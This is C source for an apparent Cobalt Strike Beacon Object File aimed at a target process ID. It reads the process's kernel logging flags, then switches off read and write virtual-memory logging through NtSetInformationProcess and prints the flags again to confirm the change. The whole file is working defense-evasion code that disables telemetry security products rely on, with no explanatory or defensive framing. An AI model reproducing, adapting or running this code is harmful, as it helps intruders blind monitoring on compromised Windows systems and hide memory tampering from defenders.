#include <windows.h>
#include <processthreadsapi.h>
#include "beacon.h"
#include "bofdefs.h"

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQueryInformationProcess(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtSetInformationProcess(HANDLE, PROCESSINFOCLASS, PVOID, ULONG);
#define ProcessEnableReadWriteVmLogging ((PROCESSINFOCLASS)0x57)
#define ProcessEnableLogging ((PROCESSINFOCLASS)0x60)

typedef union _PROCESS_READWRITEVM_LOGGING_INFORMATION {
    UINT8 Flags;
    struct {
        UINT8 EnableReadVmLogging : 1;
        UINT8 EnableWriteVmLogging : 1;
        UINT8 Unused : 6;
    };
} PROCESS_READWRITEVM_LOGGING_INFORMATION, * PPROCESS_READWRITEVM_LOGGING_INFORMATION;

typedef union _PROCESS_LOGGING_INFORMATION
{
    ULONG Flags;
    struct
    {
        ULONG EnableReadVmLogging : 1;
        ULONG EnableWriteVmLogging : 1;
        ULONG EnableProcessSuspendResumeLogging : 1;
        ULONG EnableThreadSuspendResumeLogging : 1;
        ULONG EnableLocalExecProtectVmLogging : 1;
        ULONG EnableRemoteExecProtectVmLogging : 1;
        ULONG Reserved : 26;
    };
} PROCESS_LOGGING_INFORMATION, *PPROCESS_LOGGING_INFORMATION;

VOID psloginfo(DWORD pid) {
    HANDLE pHandle = KERNEL32$OpenProcess(0x0400, FALSE, pid);
    if (pHandle == NULL) {
        BeaconPrintf(0, "psloginfo: openprocess 0x0400 err: %d\n", KERNEL32$GetLastError());
        return;
    }
    PROCESS_LOGGING_INFORMATION plog;
    PROCESS_READWRITEVM_LOGGING_INFORMATION prwlog;
    ULONG outb;
    NTDLL$NtQueryInformationProcess(pHandle, ProcessEnableReadWriteVmLogging, &prwlog, sizeof(PROCESS_READWRITEVM_LOGGING_INFORMATION), &outb);
    BeaconPrintf(0, "psloginfo: prwlog: readvm %d, writevm %d\n", prwlog.EnableReadVmLogging, prwlog.EnableWriteVmLogging);

    NTDLL$NtQueryInformationProcess(pHandle, ProcessEnableLogging, &plog, sizeof(PROCESS_LOGGING_INFORMATION), &outb);
    BeaconPrintf(0, "psloginfo: plog: readvm %d, writevm %d\n\tpsuspend %d, tsuspend %d\n\tlxprotect %d, rxprotect %d\n", 
        plog.EnableReadVmLogging, 
        plog.EnableWriteVmLogging,
        plog.EnableProcessSuspendResumeLogging,
        plog.EnableThreadSuspendResumeLogging,
        plog.EnableLocalExecProtectVmLogging,
        plog.EnableRemoteExecProtectVmLogging);
    KERNEL32$CloseHandle(pHandle);

    pHandle = KERNEL32$OpenProcess(0x0200, FALSE, pid);
    if (pHandle == NULL) {
        BeaconPrintf(0, "psloginfo: openprocess 0x0200 err: %d\n", KERNEL32$GetLastError());
        return;
    }

    prwlog.EnableReadVmLogging = 0;
    prwlog.EnableWriteVmLogging = 0;
    NTDLL$NtSetInformationProcess(pHandle, ProcessEnableReadWriteVmLogging, &prwlog, sizeof(PROCESS_READWRITEVM_LOGGING_INFORMATION));


    KERNEL32$CloseHandle(pHandle);

    pHandle = KERNEL32$OpenProcess(0x0400, FALSE, pid);
    if (pHandle == NULL) {
        BeaconPrintf(0, "psloginfo (after adjusting): openprocess 0x0400 err: %d\n", KERNEL32$GetLastError());
        return;
    }

    NTDLL$NtQueryInformationProcess(pHandle, ProcessEnableReadWriteVmLogging, &prwlog, sizeof(PROCESS_READWRITEVM_LOGGING_INFORMATION), &outb);
    BeaconPrintf(0, "psloginfo (after adjusting): prwlog: readvm %d, writevm %d\n", prwlog.EnableReadVmLogging, prwlog.EnableWriteVmLogging);

    NTDLL$NtQueryInformationProcess(pHandle, ProcessEnableLogging, &plog, sizeof(PROCESS_LOGGING_INFORMATION), &outb);
    BeaconPrintf(0, "psloginfo (after adjusting): plog: readvm %d, writevm %d\n\tpsuspend %d, tsuspend %d\n\tlxprotect %d, rxprotect %d\n", 
        plog.EnableReadVmLogging, 
        plog.EnableWriteVmLogging,
        plog.EnableProcessSuspendResumeLogging,
        plog.EnableThreadSuspendResumeLogging,
        plog.EnableLocalExecProtectVmLogging,
        plog.EnableRemoteExecProtectVmLogging);
    KERNEL32$CloseHandle(pHandle);


}

VOID go( 
        IN PCHAR Buffer, 
        IN ULONG Length 
) 
{
    


    datap parser = {0};
    BeaconDataParse(&parser, Buffer, Length);
    DWORD pid = (DWORD)BeaconDataInt(&parser);
    if (pid == 0) 
        pid = KERNEL32$GetCurrentProcessId();
    psloginfo(pid);
    
    

};

